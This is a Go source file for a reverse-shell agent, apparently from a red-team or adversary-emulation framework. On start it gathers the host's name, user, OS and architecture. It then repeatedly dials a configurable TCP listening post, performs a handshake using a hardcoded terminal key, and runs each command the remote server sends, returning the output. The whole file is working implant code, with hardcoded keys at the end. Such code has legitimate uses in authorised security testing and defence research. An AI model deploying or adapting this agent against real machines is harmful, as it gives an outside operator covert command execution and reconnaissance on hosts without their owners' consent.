package main

import (
   "bufio"
   "fmt"
   "net"
   "strings"
   "os"
   "os/user"
   "runtime"
   "time"
   "flag"
   "strconv"

   "./util"
   "./output"
   "./commands"
)

var shellInfo, httpServer, paw string

func listen(conn net.Conn, paw []byte) {
    scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
        message := scanner.Text()
        bites, status := commands.RunCommand(strings.TrimSpace(message), httpServer)
        statusBites := []byte(fmt.Sprintf("%s$", strconv.Itoa(status)))
        response := append(paw, statusBites...)
        conn.Write(append(response, bites...))
    }
}

func handshake(conn net.Conn) string {
    conn.Write([]byte(terminal_key))
    conn.Write([]byte("\n"))
    conn.Write([]byte(shellInfo))
    conn.Write([]byte("\n"))
    data := make([]byte, 512)
    n, _ := conn.Read(data)
    paw := string(data[:n])
    conn.Write([]byte("\n"))
    return strings.TrimSpace(string(paw))
}

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   platform := runtime.GOOS
   architecture := runtime.GOARCH
   executors := util.DetermineExecutors(platform, architecture)
   shellInfo = fmt.Sprintf("%s$%s$%s$%s$%s", host, user.Username, platform, architecture, executors)

   verbose := flag.Bool("v", false, "Enable verbose output")
   tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
   udp := flag.String("udp", "127.0.0.1:5679", "The IP of the TCP listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
   flag.Parse()
   httpServer = *http

   output.SetVerbose(*verbose)
   output.VerbosePrint(fmt.Sprintf("[*] TCP socket: %s", *tcp))
   output.VerbosePrint(fmt.Sprintf("[*] UDP socket: %s", *udp))

   for {
      conn, err := net.Dial("tcp", *tcp)
      if err != nil {
         fmt.Println(fmt.Sprintf("[-] %s", err))
      } else {
          paw = handshake(conn)
          output.VerbosePrint(fmt.Sprintf("[+] reverse-shell established for %s", paw))
          listen(conn, []byte(fmt.Sprintf("%s$", paw)))
      }
      time.Sleep(5 * time.Second)
   }
}

var key = "MY3DUY6IVC5LN956Q4KUEQEZ2TRQL9"
var terminal_key = "94699f9970213dd1d4054ca678f1278a"